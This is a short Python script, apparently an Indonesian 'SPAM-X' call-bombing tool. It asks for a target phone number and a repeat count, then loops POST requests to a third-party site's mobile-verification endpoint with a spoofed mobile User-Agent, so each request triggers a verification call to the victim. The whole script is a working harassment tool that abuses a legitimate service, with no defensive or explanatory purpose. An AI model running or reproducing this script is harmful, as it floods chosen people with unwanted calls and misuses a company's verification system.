#bin/usr/python
##################
#copyright ©HEXID#
#################
#module
import os 
import sys
import time 
import requests
import figlet
import threading
import itertools
#loading
time.sleep(3)
os.system("clear")
done = False

#animasi loading
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r login now ')

t = threading.Thread(target=animate)
t.start()

#proses lama disini

time.sleep(10)
done = True
time.sleep(3)
sent = 0
#tampilan
time.sleep(1)
os.system("clear")
os.system("cowsay -f dragon.cow  SPAM-X")
print(88 * "=")
print("""
              [+] AUTHOR :HEXID
              [+] GITHUB :https://github.com/Sopian20
              [+] TIME   :X-TIME BOGOR
      """)
print(88 * "=")
time.sleep(1)
no = input("MASUKAN NO TARGET: ")
jum = int(input("MASUKAN JUMLAH SPAM-X: "))
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jum):
    send = requests.post(url+no, headers=ua, data=dat)
    print(" [+] Status -> ",(send.json()["message"]))